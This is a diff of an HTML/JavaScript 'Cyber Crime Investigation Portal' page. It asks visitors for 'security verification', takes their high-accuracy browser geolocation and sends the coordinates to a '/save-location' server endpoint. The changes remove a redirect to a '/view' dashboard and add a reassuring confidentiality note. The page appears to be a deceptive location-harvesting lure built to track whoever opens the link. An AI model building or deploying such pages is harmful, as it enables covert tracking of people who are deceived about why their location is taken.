@@ -3,9 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Cyber Crime Investigation Portal</title>
-
 <style>
 *{
     margin:0;
@@ -13,7 +11,6 @@
     box-sizing:border-box;
     font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 }
-
 body{
     background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     min-height:100vh;
@@ -22,7 +19,6 @@ body{
     align-items:center;
     padding:20px;
 }
-
 .card{
     width:100%;
     max-width:450px;
@@ -33,7 +29,6 @@ body{
     text-align:center;
     animation:fadeIn 0.5s ease-in;
 }
-
 @keyframes fadeIn{
     from{
         opacity:0;
@@ -44,24 +39,20 @@ body{
         transform:translateY(0);
     }
 }
-
 .logo{
     font-size:48px;
     margin-bottom:20px;
 }
-
 h2{
     color:#333;
     margin-bottom:10px;
     font-size:28px;
 }
-
 .subtitle{
     color:#666;
     margin-bottom:30px;
     font-size:14px;
 }
-
 button{
     width:100%;
     border:none;
@@ -74,17 +65,18 @@ button{
     transition:all 0.3s;
     font-weight:600;
 }
-
 button:hover{
     background:#1d4ed8;
     transform:translateY(-2px);
     box-shadow:0 5px 15px rgba(37,99,235,0.3);
 }
-
 button:active{
     transform:translateY(0);
 }
-
+button:disabled{
+    opacity:0.6;
+    cursor:not-allowed;
+}
 .loader{
     display:none;
     width:50px;
@@ -95,112 +87,77 @@ button:active{
     margin:20px auto;
     animation:spin 0.8s linear infinite;
 }
-
 @keyframes spin{
     100%{
         transform:rotate(360deg);
     }
 }
-
 #status{
     margin-top:20px;
     font-size:14px;
     padding:12px;
     border-radius:8px;
 }
-
 .success{
     background:#d1fae5;
     color:#065f46;
 }
-
 .error{
     background:#fee2e2;
     color:#991b1b;
 }
-
 .info{
     background:#e0e7ff;
     color:#3730a3;
 }
-
-.hidden{
-    display:none;
-}
-
-.redirect-message{
-    margin-top:15px;
-    font-size:12px;
-    color:#6b7280;
+.note{
+    margin-top:20px;
+    font-size:11px;
+    color:#9ca3af;
 }
 </style>
 </head>
-
 <body>
-
 <div class="card">
-
     <div class="logo">🔒</div>
-
     <h2>Verification Required</h2>
-
     <div class="subtitle">
         Your location will be collected for security verification
     </div>
-
     <button id="verifyBtn" onclick="startVerification()">
         Continue to Verification
     </button>
-
     <div class="loader" id="loader"></div>
-
     <div id="status"></div>
-
-    <div class="redirect-message" id="redirectMsg"></div>
-
+    <div class="note">
+        This information is confidential and used only for verification purposes.
+    </div>
 </div>
-
 <script>
-
 function startVerification(){
-
-    // Disable button to prevent multiple clicks
     const btn = document.getElementById("verifyBtn");
     btn.disabled = true;
     btn.style.opacity = "0.6";
     btn.textContent = "Processing...";
-
     document.getElementById("loader").style.display = "block";
-    
     const statusDiv = document.getElementById("status");
     statusDiv.className = "info";
     statusDiv.innerHTML = "📍 Requesting location permission...";
-
     getLocation();
 }
-
 function getLocation() {
-
     let statusBox = document.getElementById("status");
-
     if (!navigator.geolocation) {
-
         statusBox.className = "error";
         statusBox.innerHTML = "❌ Geolocation is not supported by your browser";
         resetButton();
         return;
     }
-
     navigator.geolocation.getCurrentPosition(
-
         function(position){
-
             statusBox.className = "info";
             statusBox.innerHTML = "📡 Sending location data to server...";
-
-            // Send to Flask backend
             fetch('/save-location', {
-
                 method:'POST',
                 headers:{
                     'Content-Type':'application/json'
@@ -210,35 +167,20 @@ function getLocation() {
                     longitude:position.coords.longitude,
                     accuracy:position.coords.accuracy
                 })
-
             })
-
             .then(response => response.json())
-
             .then(data => {
-
                 document.getElementById("loader").style.display = "none";
-
                 if(data.status === "success"){
                     statusBox.className = "success";
-                    statusBox.innerHTML = "✅ Verification completed successfully!";
-                    
-                    // Show redirect message
-                    document.getElementById("redirectMsg").innerHTML = 
-                        "Redirecting to dashboard in 3 seconds...";
-                    
-                    // Optional: Redirect to dashboard after 3 seconds
-                    setTimeout(() => {
-                        window.location.href = "/view";
-                    }, 3000);
+                    statusBox.innerHTML = "✅ Verification completed successfully! Thank you.";
+                    resetButton();
                 } else {
                     statusBox.className = "error";
                     statusBox.innerHTML = "❌ Server error: " + data.message;
                     resetButton();
                 }
-
             })
-
             .catch(error => {
                 document.getElementById("loader").style.display = "none";
                 statusBox.className = "error";
@@ -246,15 +188,10 @@ function getLocation() {
                 console.error("Fetch error:", error);
                 resetButton();
             });
-
         },
-
         function(error){
-
             document.getElementById("loader").style.display = "none";
-
             let msg = "";
-            
             switch(error.code){
                 case 1:
                     msg = "Permission denied. Please allow location access.";
@@ -268,31 +205,24 @@ function getLocation() {
                 default:
                     msg = "Unknown error occurred.";
             }
-
             statusBox.className = "error";
             statusBox.innerHTML = "❌ " + msg;
             resetButton();
         },
-
         {
             enableHighAccuracy: true,
             timeout: 15000,
             maximumAge: 0
         }
-
     );
 }
-
 function resetButton() {
     const btn = document.getElementById("verifyBtn");
     btn.disabled = false;
     btn.style.opacity = "1";
-    btn.textContent = "Try Again";
+    btn.textContent = "Continue to Verification";
     document.getElementById("loader").style.display = "none";
 }
-
-// Optional: Auto redirect if already verified? (No need)
 </script>
-
 </body>
 </html>
